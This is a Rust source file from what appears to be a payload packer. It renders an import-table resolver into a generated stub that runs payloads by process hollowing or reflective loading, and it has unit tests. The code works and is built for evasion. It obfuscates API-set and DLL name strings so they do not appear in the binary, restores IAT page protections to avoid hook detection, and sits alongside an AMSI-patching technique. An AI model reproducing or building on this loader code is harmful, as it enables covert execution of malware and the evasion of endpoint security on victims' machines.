//! Shared payload import-table resolution for the generated stub.
//!
//! Both execution techniques must turn the payload's import table into real
//! function addresses before the payload runs: process hollowing writes an
//! import-descriptor-free image into a suspended process, and reflective
//! loading maps one into the current process. The walk over the import
//! descriptors is identical, so it is rendered once (as `$IMPORTS_BLOCK$`)
//! instead of being duplicated inside every execution fragment.
//!
//! Addresses are resolved in the *current* process. Windows assigns the system
//! DLLs a single base per session (ASLR for system DLLs is session-wide, not
//! per-process), so an address resolved here is valid in the hollowing target
//! **as long as the target also has that DLL mapped**. The known limitation
//! this leaves is documented in `docs/techniques/process_hollowing.md`.

use super::obfuscation::StringsConfig;
use crate::techniques::RuntimeStep;

/// Whether the active pipeline needs the shared import resolver.
pub fn needed(pipeline: &[RuntimeStep]) -> bool {
    pipeline
        .iter()
        .any(|step| crate::techniques::find(step.name()).is_some_and(|def| def.resolves_imports))
}

/// Renders the `$IMPORTS_BLOCK$` fragment for the given pipeline.
///
/// Emits an empty string when no active technique resolves imports (nothing
/// references `resolve_imports` then, so no dead code is injected).
pub fn render_block(pipeline: &[RuntimeStep], strings: &StringsConfig) -> String {
    if !needed(pipeline) {
        return String::new();
    }

    // Every runtime literal in this block goes through `StringsConfig`; the
    // API set names and their contract hosts would otherwise leak into the
    // binary's strings.
    let apiset_prefix = strings
        .obfuscate("api-ms-win")
        .render_stub_expr("apiset_prefix");
    let apiset_crt = strings
        .obfuscate("api-ms-win-crt")
        .render_stub_expr("apiset_crt");
    let crt_host = strings
        .obfuscate("ucrtbase.dll")
        .render_stub_expr("crt_host");
    let kernel_host = strings
        .obfuscate("kernel32.dll")
        .render_stub_expr("kernel_host");

    IMPORTS_BLOCK
        .replace("$APISET_PREFIX_DEF$", &apiset_prefix)
        .replace("$APISET_CRT_DEF$", &apiset_crt)
        .replace("$CRT_HOST_DEF$", &crt_host)
        .replace("$KERNEL_HOST_DEF$", &kernel_host)
}

/// The block body. It is wrapped in `mod imports` so its `use` statements
/// cannot collide with the technique fragments injected into the same file,
/// and re-exported so the fragments call `crate::resolve_imports`.
const IMPORTS_BLOCK: &str = r##"mod imports {
    use std::ffi::{c_void, CStr};

    use windows::core::PCSTR;
    use windows::Win32::Foundation::HMODULE;
    use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
    use windows::Win32::System::Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_READWRITE};

    /// `IMAGE_ORDINAL_FLAG64`: an import thunk with this bit set is by ordinal.
    const IMAGE_ORDINAL_FLAG64: u64 = 0x8000_0000_0000_0000;
    /// `IMAGE_ORDINAL_FLAG32`: the same flag for a 32-bit import thunk.
    const IMAGE_ORDINAL_FLAG32: u64 = 0x8000_0000;
    /// Page size used when restoring the IAT page protections.
    const PAGE_SIZE: usize = 0x1000;

    /// Reads the image's optional-header magic and reports whether it is PE32+
    /// (`0x20B`, 64-bit) rather than PE32 (`0x10B`, 32-bit).
    ///
    /// The payload's architecture matches the stub's (the packer enforces it),
    /// but the width of every import thunk, IAT slot and ordinal flag is a
    /// property of the *image*, so the resolver reads it instead of assuming.
    fn is_pe32plus_image(image: &[u8]) -> Result<bool, ImportError> {
        let e_lfanew = read_u32(image, 0x3C)? as usize;
        match read_u16(image, e_lfanew + 24)? {
            0x20B => Ok(true),
            0x10B => Ok(false),
            magic => Err(ImportError::Malformed(format!(
                "unknown optional-header magic 0x{magic:04x}"
            ))),
        }
    }

    /// What the loader does with one payload import slot, as returned by the
    /// generated `resolution_policy`.
    #[derive(Debug, Clone, Copy, PartialEq, Eq)]
    #[allow(dead_code)]
    pub enum ImportPolicy {
        /// Point the IAT slot at the generated proxy for this API.
        Proxy(u64),
        /// Resolve the real export and use it (no interposition).
        Forward,
        /// Refuse to load: `build.stub.api_resolution.unmatched: abort`.
        Abort,
    }

    #[derive(Debug, thiserror::Error)]
    pub enum ImportError {
        #[error("the import directory (RVA 0x{rva:08x}) is not mapped")]
        DirectoryUnmapped { rva: u32 },
        #[error("malformed import table: {0}")]
        Malformed(String),
        #[error("could not load the imported DLL '{dll}'")]
        LoadFailed { dll: String },
        #[error("could not resolve '{func}' from '{dll}'")]
        ResolveFailed { dll: String, func: String },
        #[error("'{func}' from '{dll}' is not in the interception catalogue (unmatched: abort)")]
        Abort { dll: String, func: String },
        #[error("could not change the protection of the import table")]
        ProtectFailed,
    }

    /// Resolves the payload's import table into `(IAT RVA, address)` pairs.
    ///
    /// `rva_to_offset` maps an image RVA to a byte offset inside `image`, which
    /// lets the same code walk a file-layout image (process hollowing) and an
    /// already-mapped image whose RVAs are their own offsets (reflective
    /// loading). `policy` decides, per `(dll, function)`, whether the slot is
    /// served by a generated proxy (`ImportPolicy::Proxy`), by the real
    /// resolution (`ImportPolicy::Forward`), or refused (`ImportPolicy::Abort`,
    /// i.e. `build.stub.api_resolution.unmatched: abort`). The caller writes each
    /// resulting value into its IAT slot.
    pub fn resolve_imports<F, P>(
        image: &[u8],
        import_dir_rva: u32,
        import_dir_size: u32,
        rva_to_offset: F,
        policy: P,
    ) -> Result<Vec<(u32, u64)>, ImportError>
    where
        F: Fn(u32) -> Option<usize>,
        P: Fn(&str, &str) -> ImportPolicy,
    {
        let mut resolved = Vec::new();
        if import_dir_rva == 0 || import_dir_size == 0 {
            return Ok(resolved);
        }

        // Thunk width, ordinal flag and IAT stride all follow the image layout.
        let pe32plus = is_pe32plus_image(image)?;
        let thunk_size: u32 = if pe32plus { 8 } else { 4 };
        let ordinal_flag = if pe32plus {
            IMAGE_ORDINAL_FLAG64
        } else {
            IMAGE_ORDINAL_FLAG32
        };

        let mut desc = rva_to_offset(import_dir_rva).ok_or(ImportError::DirectoryUnmapped {
            rva: import_dir_rva,
        })?;

        loop {
            let name_rva = read_u32(image, desc + 12)?;
            let first_thunk = read_u32(image, desc + 16)?;
            let original_thunk = read_u32(image, desc)?;
            if name_rva == 0 && first_thunk == 0 && original_thunk == 0 {
                break;
            }

            let name_off = rva_to_offset(name_rva).ok_or_else(|| {
                ImportError::Malformed(format!("DLL name RVA 0x{name_rva:08x} is not mapped"))
            })?;
            let dll = unsafe { CStr::from_ptr(image.as_ptr().add(name_off) as *const i8) }
                .to_string_lossy()
                .into_owned();
            let module = load_module(image, name_off, &dll)?;
            crate::tech_dbg!("imports", "loading '{dll}'");

            let mut i = 0u32;
            loop {
                let thunk_rva = original_thunk + i * thunk_size;
                let thunk_off = rva_to_offset(thunk_rva).ok_or_else(|| {
                    ImportError::Malformed(format!("thunk RVA 0x{thunk_rva:08x} is not mapped"))
                })?;
                let value = if pe32plus {
                    read_u64(image, thunk_off)?
                } else {
                    u64::from(read_u32(image, thunk_off)?)
                };
                if value == 0 {
                    break;
                }

                let (address, func) = if value & ordinal_flag != 0 {
                    let ordinal = value & 0xFFFF;
                    (
                        unsafe { GetProcAddress(module, PCSTR(ordinal as *const u8)) },
                        format!("#{ordinal}"),
                    )
                } else {
                    let by_name_off = rva_to_offset(value as u32).ok_or_else(|| {
                        ImportError::Malformed(format!(
                            "import name RVA 0x{:08x} is not mapped",
                            value as u32
                        ))
                    })?;
                    // IMAGE_IMPORT_BY_NAME: `WORD Hint; CHAR Name[];`
                    let name_ptr = unsafe { image.as_ptr().add(by_name_off + 2) } as *const i8;
                    let name = unsafe { CStr::from_ptr(name_ptr) }
                        .to_string_lossy()
                        .into_owned();
                    (
                        unsafe { GetProcAddress(module, PCSTR(name_ptr as *const u8)) },
                        name,
                    )
                };

                match policy(&dll, &func) {
                    ImportPolicy::Proxy(proxy) => {
                        resolved.push((first_thunk + i * thunk_size, proxy));
                    }
                    ImportPolicy::Forward => {
                        let real = address.ok_or_else(|| ImportError::ResolveFailed {
                            dll: dll.clone(),
                            func,
                        })?;
                        resolved.push((first_thunk + i * thunk_size, real as u64));
                    }
                    ImportPolicy::Abort => {
                        return Err(ImportError::Abort {
                            dll: dll.clone(),
                            func,
                        });
                    }
                }
                i += 1;
            }

            desc += 20;
        }

        crate::tech_dbg!("imports", "resolved {} import(s)", resolved.len());
        Ok(resolved)
    }

    /// Resolves the payload's imports and writes them into an already-mapped
    /// image's IAT, serving catalogue hits from `policy`.
    ///
    /// The slot range is made writable first (the loader maps the IAT
    /// read-only) and every touched page is restored to its original protection
    /// afterwards, so the IAT does not stay writable (which is itself an
    /// IAT-hook signal). The mapped image uses identity RVA→offset mapping.
    pub fn patch_imports<P>(
        image: &mut [u8],
        import_dir_rva: u32,
        import_dir_size: u32,
        policy: P,
    ) -> Result<usize, ImportError>
    where
        P: Fn(&str, &str) -> ImportPolicy,
    {
        let imports = resolve_imports(
            image,
            import_dir_rva,
            import_dir_size,
            |rva| Some(rva as usize),
            &policy,
        )?;
        if imports.is_empty() {
            return Ok(0);
        }

        let base = image.as_ptr() as usize;
        let slot_size = if is_pe32plus_image(image)? { 8usize } else { 4usize };
        let mut lo = usize::MAX;
        let mut hi = 0usize;
        for (rva, _) in &imports {
            let at = base + *rva as usize;
            lo = lo.min(at);
            hi = hi.max(at + slot_size);
        }

        // Record each page's original protection and make the range writable.
        let mut pages: Vec<(usize, PAGE_PROTECTION_FLAGS)> = Vec::new();
        let mut page = lo & !(PAGE_SIZE - 1);
        while page < hi {
            let mut old = PAGE_PROTECTION_FLAGS(0);
            unsafe {
                VirtualProtect(page as *const c_void, PAGE_SIZE, PAGE_READWRITE, &mut old)
                    .map_err(|_| ImportError::ProtectFailed)?;
            }
            pages.push((page, old));
            page += PAGE_SIZE;
        }

        let count = imports.len();
        for (iat_rva, address) in imports {
            let slot = base + iat_rva as usize;
            if slot_size == 8 {
                unsafe { *(slot as *mut u64) = address };
            } else {
                // PE32: the IAT slot is 4 bytes wide.
                unsafe { *(slot as *mut u32) = address as u32 };
            }
        }

        // Restore the original protection, page by page.
        for (page, old) in pages {
            let mut tmp = PAGE_PROTECTION_FLAGS(0);
            unsafe {
                let _ = VirtualProtect(page as *const c_void, PAGE_SIZE, old, &mut tmp);
            }
        }
        Ok(count)
    }

    /// Loads an imported DLL by name.
    ///
    /// API set names are virtual: no such file exists on disk. On Windows 10+
    /// the loader resolves them through the API set schema in the PEB, so
    /// `LoadLibraryA` returns the contract host's module. If that ever fails,
    /// fall back to a family-based host (the CRT contract lives in `ucrtbase`,
    /// the rest in `kernel32`) so an API set import still resolves instead of
    /// failing outright.
    fn load_module(image: &[u8], name_off: usize, dll: &str) -> Result<HMODULE, ImportError> {
        let name_ptr = unsafe { image.as_ptr().add(name_off) };
        if let Ok(module) = unsafe { LoadLibraryA(PCSTR(name_ptr)) } {
            return Ok(module);
        }

        let apiset_prefix: String = $APISET_PREFIX_DEF$;
        if dll.len() >= apiset_prefix.len()
            && dll[..apiset_prefix.len()].eq_ignore_ascii_case(&apiset_prefix)
        {
            let crt_prefix: String = $APISET_CRT_DEF$;
            let host: String = if dll.len() >= crt_prefix.len()
                && dll[..crt_prefix.len()].eq_ignore_ascii_case(&crt_prefix)
            {
                $CRT_HOST_DEF$
            } else {
                $KERNEL_HOST_DEF$
            };
            let mut host_buf = host.into_bytes();
            host_buf.push(0);
            if let Ok(module) = unsafe { LoadLibraryA(PCSTR(host_buf.as_ptr())) } {
                return Ok(module);
            }
        }

        Err(ImportError::LoadFailed {
            dll: dll.to_string(),
        })
    }

    fn read_u16(bytes: &[u8], offset: usize) -> Result<u16, ImportError> {
        let s = bytes.get(offset..offset.checked_add(2).ok_or_else(bounds)?).ok_or_else(bounds)?;
        Ok(u16::from_le_bytes([s[0], s[1]]))
    }

    fn read_u32(bytes: &[u8], offset: usize) -> Result<u32, ImportError> {
        let s = bytes.get(offset..offset.checked_add(4).ok_or_else(bounds)?).ok_or_else(bounds)?;
        Ok(u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
    }

    fn read_u64(bytes: &[u8], offset: usize) -> Result<u64, ImportError> {
        let s = bytes.get(offset..offset.checked_add(8).ok_or_else(bounds)?).ok_or_else(bounds)?;
        Ok(u64::from_le_bytes([
            s[0], s[1], s[2], s[3], s[4], s[5], s[6], s[7],
        ]))
    }

    fn bounds() -> ImportError {
        ImportError::Malformed("read out of bounds".to_string())
    }
}

#[allow(unused_imports)]
use imports::{patch_imports, resolve_imports, ImportError, ImportPolicy};
"##;

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::obfuscation::{StringStrategy, StringsConfig};
    use crate::techniques::RuntimeStep;

    fn xor_config() -> StringsConfig {
        StringsConfig {
            strategy: StringStrategy::Xor,
            key: Some([0x5Au8; 32]),
        }
    }

    fn pipeline(yaml: &str) -> Vec<RuntimeStep> {
        vec![serde_yml::from_str(yaml).expect("pipeline step")]
    }

    #[test]
    fn needed_for_both_execution_techniques() {
        assert!(needed(&pipeline("technique: process_hollowing\n")));
        assert!(needed(&pipeline("technique: reflective_loading\n")));
    }

    #[test]
    fn not_needed_for_a_preparation_only_pipeline() {
        assert!(!needed(&pipeline("technique: patch_amsi\n")));
    }

    #[test]
    fn an_unneeded_block_is_empty() {
        let block = render_block(&pipeline("technique: patch_amsi\n"), &xor_config());
        assert!(block.is_empty(), "unexpected block: {block}");
    }

    #[test]
    fn renders_the_resolver_and_reexports_it() {
        let block = render_block(&pipeline("technique: process_hollowing\n"), &xor_config());
        assert!(block.contains("pub fn resolve_imports"));
        assert!(block.contains("pub fn patch_imports"));
        assert!(block.contains("pub enum ImportPolicy"));
        assert!(block
            .contains("use imports::{patch_imports, resolve_imports, ImportError, ImportPolicy};"));
        // The IAT is made writable and its pages restored.
        assert!(block.contains("VirtualProtect"));
        assert!(block.contains("PAGE_READWRITE"));
        // No placeholder may survive into the generated stub.
        assert!(!block.contains('$'), "unsubstituted placeholder: {block}");
    }

    /// The API set names and their hosts are runtime literals: they must not
    /// appear in cleartext in the generated source.
    #[test]
    fn api_set_strings_are_obfuscated() {
        let block = render_block(&pipeline("technique: process_hollowing\n"), &xor_config());
        for literal in [
            "api-ms-win",
            "api-ms-win-crt",
            "ucrtbase.dll",
            "kernel32.dll",
        ] {
            assert!(
                !block.contains(literal),
                "cleartext literal '{literal}' leaked: {block}"
            );
        }
        assert!(block.contains("crate::dec_xor"));
    }

    #[test]
    fn stack_strategy_obfuscates_without_dec_xor() {
        let strings = StringsConfig {
            strategy: StringStrategy::Stack,
            key: None,
        };
        let block = render_block(&pipeline("technique: process_hollowing\n"), &strings);
        assert!(!block.contains("crate::dec_xor"));
        assert!(!block.contains("ucrtbase.dll"));
        assert!(block.contains("std::hint::black_box"));
    }
}
